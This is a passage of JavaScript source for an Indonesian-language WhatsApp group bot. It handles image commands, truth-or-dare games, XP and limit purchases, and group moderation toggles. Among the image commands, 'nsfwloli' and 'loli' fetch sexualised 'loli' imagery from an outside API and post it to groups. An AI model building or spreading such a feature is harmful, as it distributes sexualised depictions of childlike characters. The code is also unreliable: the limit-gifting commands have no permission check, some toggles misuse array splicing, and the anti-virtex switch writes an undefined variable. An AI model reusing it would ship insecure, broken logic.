              fs.unlinkSync(`./${sender}.jpeg`)
              limitAdd(sender, limit)
              break   
                
                    
               case 'waifu':
      case 'loli':
      case 'husbu':
      case 'milf':
      case 'cosplay':
      case 'naruto':
      case 'wibu':
      case 'aeshtetic':
      case 'wallpaperanime': 
      case 'animefanart': 
      case 'izimumisagiri': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)      
        let wipu = await fetchJson(
          `https://dhn-api.herokuapp.com/search/pinterest/image?query=${command}&apikey=${dhkey}`
        );
        gmbr = wipu.result[Math.floor(Math.random() * wipu.result.length)];
        fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(gmbr.orig.url));
        buttons = [
          {
            buttonId: `${prefix + command}`,
            buttonText: { displayText: `Next➬` },
            type: 1,
          },
        ];
        imageMsg = (
          await arifi.prepareMessage(
            from,
            fs.readFileSync(`./${sender}.jpeg`),
            'imageMessage',
            { thumbnail: Buffer.alloc(0) }
          )
        ).message.imageMessage;
        buttonsMessage = {
          footerText: `${watermark}`,
          imageMessage: imageMsg,
          contentText: `klik Next untuk ke gambar selanjut nya`,
          buttons,
          headerType: 4,
        };
        prep = await arifi.prepareMessageFromContent(
          from,
          { buttonsMessage },
          { quoted: rojak }
        );
        arifi.relayWAMessage(prep);
        fs.unlinkSync(`./${sender}.jpeg`);
        limitAdd(sender, limit)
        break;  

       
                
                case 'wallpaper': 
              if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
               reply(mess.wait)
                getBuffer(`https://api.lolhuman.xyz/api/random2/wallpaper?apikey=${lolkey}`).then((gambar) => {
                kott = `*_CLICK NEXT UNTUK SELANJUTNYA_*`
                    sendButImage(from, kott, `${watermark}`, gambar, [                      
          {
            buttonId: `${prefix}${command}`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);                          
        })
                limitAdd(sender, limit)
                break  
                case 'nsfwneko': 
              if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				if (!isNsfw) return reply(mess.nsfwoff)	
			   reply(mess.wait)
                getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/neko?apikey=${lolkey}`).then((gambar) => {
                arifi.sendMessage(from, gambar, image, { quoted: rojak })
                })
                limitAdd(sender, limit)
                break  
                case 'nsfwwaifu': 
              if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				if (!isNsfw) return reply(mess.nsfwoff)	
			   reply(mess.wait)
                getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/waifu?apikey=${lolkey}`).then((gambar) => {
                arifi.sendMessage(from, gambar, image, { quoted: rojak })
                })
                limitAdd(sender, limit)
                break  
                case 'nsfwloli': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				if (!isNsfw) return reply(mess.nsfwoff)	
			    reply(mess.wait)
                getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=${lolkey}`).then((gambar) => {
                arifi.sendMessage(from, gambar, image, { quoted: rojak })
                })
                limitAdd(sender, limit)
                break   
                case 'nsfweroyuri': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				if (!isNsfw) return reply(mess.nsfwoff)	
			    reply(mess.wait)
                getBuffer(`https://api.lolhuman.xyz/api/random2/eroyuri?apikey=${lolkey}`).then((gambar) => {
                arifi.sendMessage(from, gambar, image, { quoted: rojak })
                })
                limitAdd(sender, limit)
                break   
                case 'nsfwero': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				if (!isNsfw) return reply(mess.nsfwoff)	
			    reply(mess.wait)
                getBuffer(`https://api.lolhuman.xyz/api/random2/ero?apikey=${lolkey}`).then((gambar) => {
                arifi.sendMessage(from, gambar, image, { quoted: rojak })
                })
                limitAdd(sender, limit)
                break   
                case 'nsfwkuni': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				if (!isNsfw) return reply(mess.nsfwoff)	
			    reply(mess.wait)
                getBuffer(`https://api.lolhuman.xyz/api/random2/kuni?apikey=${lolkey}`).then((gambar) => {
                arifi.sendMessage(from, gambar, image, { quoted: rojak })
                })
                limitAdd(sender, limit)
                break  
                case 'hentai': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
		     	if (!isNsfw) return reply(mess.nsfwoff)	
			    reply(mess.wait)
                getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${lolkey}`).then((gambar) => {
                arifi.sendMessage(from, gambar, image, { quoted: rojak })
                })
                limitAdd(sender, limit)
                break  
                case 'yuri': 
              if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				if (!isNsfw) return reply(mess.nsfwoff)	
			   reply(mess.wait)
                getBuffer(`https://api.lolhuman.xyz/api/random2/yuri?apikey=${lolkey}`).then((gambar) => {
                arifi.sendMessage(from, gambar, image, { quoted: rojak })
                })
                limitAdd(sender, limit)
                break   
                case 'artinama':
		if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} ${pushname}`)
                    ini_nama = args.join(' ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/artinama?apikey=${lolkey}&nama=${ini_nama}`)
                    reply(get_result.result) 
                    limitAdd(sender, limit)
                    break  
                    case 'truthdare':
                    if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
   trteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
   sendButImage(from, `*_SILAHKAN PILIHAN SALAH SATU_*`, `${watermark}`, trteh, [                      
          {
            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `TRUTH`,
            },
            type: 1,
            },
          {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `DARE`,
            },
            type: 1,
          },
        ]);                         
				limitAdd(sender, limit)
				break
                case 'truth':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				let trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buorangu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
				let ttrth = trut[Math.floor(Math.random() * trut.length)]
				truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
                sendButImage(from, '*Truth*\n\n'+ ttrth, `${watermark}`, truteh, [                      
          {
            buttonId: `${prefix}${command}`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);                                  
				limitAdd(sender, limit)
				break
				case 'dare':
				if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				let dare =["Kirim pesan ke mantan kamu dan bilang 'aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang 'KAMU CANTIK BANGET NGGAK BOHONG' ke cowo','ss recent call whatsapp','drop emot '🦄💨' setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi 'gue anak lucinta luna' selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia 'i lucky to hv you','prank chat mantan dan bilang ' i love u, pgn balikan','record voice baca surah al-kautsar','bilang 'i hv crush on you, mau jadi pacarku gak?' ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak ' anjimm gabutt anjimmm ' di depan rumah mu','ganti nama jadi ' BOWO ' selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll"]
				let der = dare[Math.floor(Math.random() * dare.length)]
				kiso = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
				sendButImage(from, '*Dare*\n\n'+ der, `${watermark}`, kiso, [                      
          {
            buttonId: `${prefix}${command}`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);                                  
				limitAdd(sender, limit)
				break
				case 'bisakah':
                limitAdd(sender, limit)
				bisakah = body.slice(1)
				let bisa =['Bisa','Tidak Bisa','Coba Ulangi']
				let keh = bisa[Math.floor(Math.random() * bisa.length)]
				arifi.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: rojak })
				limitAdd(sender, limit)
				break
		        case 'kapankah':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				kapankah = body.slice(1)
				let kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
				let koh = kapan[Math.floor(Math.random() * kapan.length)]
				arifi.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: rojak })
				limitAdd(sender, limit)
				break
		        case 'apakah':
                if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				apakah = body.slice(1)
				let apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
				let kah = apa[Math.floor(Math.random() * apa.length)]
				arifi.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: rojak })
				limitAdd(sender, limit)
				break		        
                case 'jadian':
				if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
				jds = []
				let jdii = groupMembers
				let koss = groupMembers
				let akuu = jdii[Math.floor(Math.random() * jdii.length)]
				let diaa = koss[Math.floor(Math.random() * koss.length)]
				teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ♥️ @${diaa.jid.split('@')[0]} `
				jds.push(akuu.jid)
				jds.push(diaa.jid)
				mentions(teks, jds, true)
				limitAdd(sender, limit)
				break
case 'ming':

					if (isOwner | isPremium) {
					let one = Math.ceil(Math.random() * 1000)
					addLevelingXp(sender, one)
					await reply(`Kamu bagian dari prabayar, aku akan berikan sebanyak *${one}Xp* untuk anda`)
                 					     }else{
					let mining = Math.ceil(Math.random() * 1000)
					addLevelingXp(sender, mining)
					await reply(`*Selamat* ${pushname} kamu mendapatkan *${mining}Xp*`)
					}
					await limitAdd(sender)
					break
                case 'mining':
				if (isBanned) return reply(mess.baned)   
					if (!isEventon) return reply(`Maaf ${pushname} event mining tidak di aktifkan oleh owner`)
					if (isOwner | isPremium) {
					let one = Math.ceil(Math.random() * 10000000)
					addLevelingXp(sender, one)
					await reply(`Kamu bagian dari prabayar, aku akan berikan sebanyak *${one}Xp* untuk anda`)
                 					     }else{
					let mining = Math.ceil(Math.random() * 10000000)
					addLevelingXp(sender, mining)
					await reply(`*Selamat* ${pushname} kamu mendapatkan *${mining}Xp*`)
					}
					await limitAdd(sender)
					break
      //------------------< Fitur Anti antian >------------------- 
      case 'event': 
      if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        if (!isGroup) return reply('Khusus di grup');        
        if (args[0] == '1') {
          if (isEventon) return reply(`FITUR ACTIVE`)
          event.push(from)
          fs.writeFileSync(
            './database/event.json',
            JSON.stringify(event)
          );
          reply('SUCCSES ACTIVE EVENT MODE!');
        } else if (args[0] == '0') {
          event.splice(from, 1)
          fs.writeFileSync(
            './database/event.json',
            JSON.stringify(event)
          );
          reply('SUCCSES TURN OFF EVENT MODE!');
        } else if (!q) {
          sendButMessage(from, `MODE EVENT`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}event 1`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}event 0`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;  
      
      case 'nsfw': 
      if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        if (!isGroup) return reply('Khusus di grup');        
        if (args[0] == 'on') {
          if (isNsfw) return reply(`NSFW FOR ACTIVE`)
          nsfw.push(from)
          fs.writeFileSync(
            './database/nsfw.json',
            JSON.stringify(nsfw)
          );
          reply('SUCCSES ACTIVE NSFW MODE!');
        } else if (args[0] == 'off') {
          nsfw.splice(from, 1)
          fs.writeFileSync(
            './database/nsfw.json',
            JSON.stringify(nsfw)
          );
          reply('SUCCSES TURN OFF NSFW MODE!');
        } else if (!q) {
          sendButMessage(from, `MODE NFSW`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}nsfw on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}nsfw off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;  
        
        
    /*  case 'id15':
			if (!isGroup) return reply('Khusus di grup');
				if (args.length < 1) return reply('[❗] Tambahkan parameter 1 untuk mengaktifkan dan 0 untuk menonaktifkan')
				if (Number(args[0]) === 1) {
				if (isNsfw) return reply(`[❗] Fitur ${command} sudah aktif`)
				nsfw.push(from)
				fs.writeFileSync('./database/nsfw.json', JSON.stringify(nsfw))
				reply(`[❗] ON MODE`)
				} else if (Number(args[0]) === 0) {
				nsfw.splice(from, 1)
				fs.writeFileSync('./database/nsfw.json', JSON.stringify(nsfw))
				reply(`[❗] OFF MODE`)
				} else {
				} 
				break   */
								
		
      case 'antilink':         
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !rojak.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');
        if (args[0] == 'on') {
          if (isAntilink) return reply('Sudah aktif!!');
          antilink.push(from);
          fs.writeFileSync(
            './database/antilink.json',
            JSON.stringify(antilink)
          );
          reply('Sukses mengaktifkan antilink!');
        } else if (args[0] == 'off') {
          antilink.splice(from, 1);
          fs.writeFileSync(
            './database/antilink.json',
            JSON.stringify(antilink)
          );
          reply('Sukses mematikan antilink!');
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case 'antihidetag':
        if (!isGroup) return reply('Khusus di grup');
        if (!isGroupAdmins && !rojak.key.fromMe) return reply('Khusus admin');
        if (args[0] == 'on') {
          if (isAntihidetag) return reply('Sudah aktif!!');
          antihidetg.push(from);
          fs.writeFileSync(
            './database/antihidetag.json',
            JSON.stringify(antihidetg)
          );
          reply('Sukses mengaktifkan antihidetag!');
        } else if (args[0] == 'off') {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            './database/antihidetag.json',
            JSON.stringify(antihidetg)
          );
          reply('Sukses mematikan antihidetag!');
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case 'antiviewonce':
        if (!isGroup) return reply('Khusus di grup');
        if (!isGroupAdmins && !rojak.key.fromMe) return reply('Khusus admin');
        if (args[0] == 'on') {
          if (isAntiviewonce) return reply('Sudah aktif!!');
          antivo.push(from);
          fs.writeFileSync('./database/antivo.json', JSON.stringify(antivo));
          reply('Sukses mengaktifkan antiviewonce!');
        } else if (args[0] == 'off') {
          antivo.splice(from, 1);
          fs.writeFileSync('./database/antivo.json', JSON.stringify(antivo));
          reply('Sukses mematikan antiviewonce!');
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;

      case 'autojoin':
        if (!isGroup) return reply('Khusus di grup');
        if (!rojak.key.fromMe) return reply('Khusus owner');
        if (args[0] == 'on') {
          if (autojoin == true) return reply('Sudah aktif!!');
          autojoin = true;
          reply('Sukses mengaktifkan autojoin!');
        } else if (args[0] == 'off') {
          autojoin = false;
          reply('Sukses mematikan autojoin!');
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;  
          case 'del':
		        case 'd':
		        case 'delete':                
		        if (!isGroupAdmins && !rojak.key.fromMe && !isOwner) return reply('Khusus admin');
				arifi.deleteMessage(from, { id: rojak.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
				break
        
      case 'antivirtex':
        if (!isGroup) return reply('Khusus di grup');
        if (!isGroupAdmins && !rojak.key.fromMe) return reply('Khusus admin');
        if (args[0] == 'on') {
          if (isAntivirtex) return reply('Sudah aktif!!');
          antivirtex.push(from);
          fs.writeFileSync(
            './database/antivirtex.json',
            JSON.stringify(antivirtex)
          );
          reply('Sukses mengaktifkan antivirtex!');
        } else if (args[0] == 'off') {
          antivirtex.splice(from, 1);
          fs.writeFileSync('./database/antivirtex.json', JSON.stringify(ant));
          reply('Sukses mematikan antivirtex!');
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        
      case 'kickarea':
        if (!isGroup) return reply('Khusus di grup');
        if (!isGroupAdmins && !rojak.key.fromMe) return reply('Khusus admin');
        if (args[0] == 'on') {
          if (isKickarea) return reply('Sudah aktif!!');
          kickarea.push(from);
          fs.writeFileSync(
            './database/antibule.json',
            JSON.stringify(kickarea)
          );
          reply('Sukses mengaktifkan kickarea!');
        } else if (args[0] == 'off') {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            './database/antibule.json',
            JSON.stringify(kickarea)
          );
          reply('Sukses mematikan kickarea!');
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;  
        case 'leveling':
        if (!isGroup) return reply('Khusus di grup');
        if (!isGroupAdmins && !rojak.key.fromMe) return reply('Khusus admin');
        if (args[0] == 'on') {
          if (isLevelingOn) return reply('Sudah aktif!!');
          _leveling.push(from)
          fs.writeFileSync(
            './database/leveling.json',
            JSON.stringify(_leveling)
          );
          reply('Sukses mengaktifkan leveling!');
        } else if (args[0] == 'off') {
          _leveling.splice(anu, 1)
          fs.writeFileSync(
            './database/leveling.json',
            JSON.stringify(_leveling)
          );
          reply('Sukses mematikan leveling!');
        } else if (!q) {
          sendButMessage(from, `LEVELING MODE`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}leveling on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}leveling off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;  
        
                  /*    case 'claim':
                case 'klaim':
                    if (isClaimOn) return reply(mess.claimOnAlready())
                    addLevelingXp(sender, 10000)
                    let hadippp = randomNomor(1000)
                    addBalance(sender, hadipfoto, balance)
                    _claim.push(sender)
                    fs.writeFileSync('./database/claim.json', JSON.stringify(_claim))
                    await reply(mess.claimOn(hadippp))
                    break  */
                 case 'claim':   
              case 'klaim':
                    if (isClaimOn) return reply(mess.claimOnAlready)
                    addLevelingXp(sender, 10000)
                    var htgm6 = randomNomor(1000)
                    addBalance(sender, htgm6, balance)
                    _claim.push(sender)
                    fs.writeFileSync('./database/claim.json', JSON.stringify(_claim))
                    await reply(`*── 「 CLAIM  」 ──*

Selamat kamu mendapatkan *10000Xp* dan *$${htgm6}* balance
Dari claim harian`)
                    break
                    
                case 'resetlimit':
				if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
				var obj = [] 
                fs.writeFileSync('./database/claim.json', JSON.stringify(obj))
				fs.writeFileSync('./database/limit.json', JSON.stringify(obj)) 
				await reply(`LIMIT BERHASIL DI RESET`)
				break 
       /* case 'leveling':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === 'enable'){
                    if (isLevelingOn) return reply(`Udah aktif`)
                    _leveling.push(from)
					fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
					reply('leveling aktif')
                } else if (args[1].toLowerCase() === 'disable'){
                    let anu = _leveling.indexOf(from)
                    _leveling.splice(anu, 1)
                    fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
                    reply('levelinh nonaktif')
                } else {
                    testqq(from, `leveling`)
                }
                break*/

      //------------------< Fitur Grup >-------------------
      case 'listonline': //copas dari stikerinbot  
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(arifi.chats.get(id).presences),
            arifi.user.jid,
          ];
          arifi.reply(
            m.chat,
            '┌─〔 Daftar Online 〕\n' +
              online.map((v) => '├ @' + v.replace(/@.+/, '')).join`\n` +
              '\n└────',
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
        } catch (e) {
          m.reply('');
        }
        break;

      case 'sider': //copas dari stikerinbot
        if (!m.quoted) throw `Balas pesan bot!`;
        let members = m.quoted.chat.endsWith('g.us')
          ? (await arifi.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith('@broadcast')
          ? -1
          : 1;
        let { reads, deliveries } = await arifi.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Dibaca oleh:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join('\n')}
${members > 1 ? `${members - reads.length} tersisa` : ''}

*Terkirim ke:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join('\n')}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ''}
`.trim();
        m.reply(txt, null, {
          contextInfo: {
            mentionedJid: arifi.parseMention(txt),
          },
        });
        break;
      case 'q':
        if (!m.quoted) return reply('reply message!');
        let qse = arifi.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply('the message you replied does not contain a reply!');
        await qse.quoted.copyNForward(m.chat, true);
        break;
      case 'kick':
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !rojak.key.fromMe) return reply(mess.only.admin);
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (
          rojak.message.extendedTextMessage === undefined ||
          rojak.message.extendedTextMessage === null
        )
          return reply('Tag target yang ingin di kick!');
        mentioned = rojak.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          arifi.groupRemove(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = rojak.message.extendedTextMessage.contextInfo.participant;
          arifi.groupRemove(from, [anu]);
          reply(mess.success);
        } else {
          arifi.groupRemove(from, mentioned);
          reply(mess.success);
        }
        break;  
        case 'bylimit':{
if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
let ane = Number(nebal(q) * 100)
if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ane, balance)
giveLimit(sender, nebal(q), limit)
ta = `Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`
sendButMessage(from, ta, `CLICK DIBAWAH UNTUK MENGECEK LIMIT`, [
            {              
              buttonId: `${prefix}limit`,
              buttonText: {
                displayText: `🔖CHECKLIMIT`,
              },
              type: 1,
            },
          ]);                  
          }
        break;           

case 'buyglimit':{
if(!q)return reply(`Example : ${prefix + command} 10\n\nHarga 1 limit = $100 balance`)
let koinPerlimit = 100
let total = koinPerlimit * q
if (getBalance(sender,balance) <= total) return reply(`maaf Balance kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
kurangBalance(sender, total, balance)
givegame(sender, q, glimit)
kentod = `Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`
sendButMessage(from, kentod, `CLICK DIBAWAH UNTUK MENGECEK LIMIT`, [
            {              
              buttonId: `${prefix}limit`,
              buttonText: {
                displayText: `🔖CHECKLIMIT`,
              },
              type: 1,
            },
          ]);                  
          }
break

case 'gift':
if (!q)return reply(`Example : ${prefix + command} @tag 10`)
lim = q.split(' ')[1]
let tag1 = `${q.split(' ')[0].replace('@','')}@s.whatsapp.net`
giveLimit(tag1, lim, limit) 
reply(`Succes Mengirim Limit Sejumlah: *${lim}*`)
break  

case 'giftg':
if (!q)return reply(`Example : ${prefix + command} @tag 10`)
lim = q.split(' ')[1]
let tag2 = `${q.split(' ')[0].replace('@','')}@s.whatsapp.net`
givegame(tag2, lim, glimit)
reply(`Succes Mengirim Limit Game Sejumlah: *${lim}*`)
break 
case 'giftlimit':
if (!q)return reply(`Example : ${prefix + command} @tag 10`)
lim = q.split(' ')[1]
kentodd = `*_CLICK SALAH SATU UNTUK MELAKUKAN TRANSAKSI_*`
sendButMessage(from, kentodd, `${watermark}`, [
            {              
              buttonId: `${prefix}gift ${q} ${lim}`,
              buttonText: {
                displayText: `🔖LIMIT`,
              },
              type: 1, 
               },
              {              
              buttonId: `${prefix}giftg ${q} ${lim}`,
              buttonText: {
                displayText: `🎮GAME LIMIT`,
              },
              type: 1,
              },
              {              
              buttonId: `${prefix}btl`,
              buttonText: {
                displayText: `⚙️BATAL`,
              },
              type: 1,
            },
          ]);                  
         
break
case 'btl':
reply(`transaksi dibatalkan oleh owner dengan *jumlah*: ${lim}`)
break
        case 'me': case 'profile':
try {
ppimg = await arifi.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
let prmm = isPremium ? `${cekprm.days} day ${cekprm.hours} hour ${cekprm.minutes} minute ${cekprm.seconds} second`:'Not Premium'
teks = `❒ *「 Profile User 」* ❒ 

